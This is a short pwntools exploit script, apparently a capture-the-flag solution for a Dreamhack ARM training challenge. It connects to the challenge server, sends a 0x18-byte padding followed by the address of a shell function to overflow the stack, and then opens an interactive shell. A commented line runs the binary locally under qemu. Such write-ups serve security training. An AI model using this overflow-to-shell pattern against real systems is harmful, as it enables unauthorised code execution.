from pwn import *

context.arch='arm'
context.bits = 32

# r = process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabi', './arm_training-v1'])
r = remote('host3.dreamhack.games', 10546)
sh=0x10558
r.sendline(b'A'*0x18+p32(sh))

r.interactive()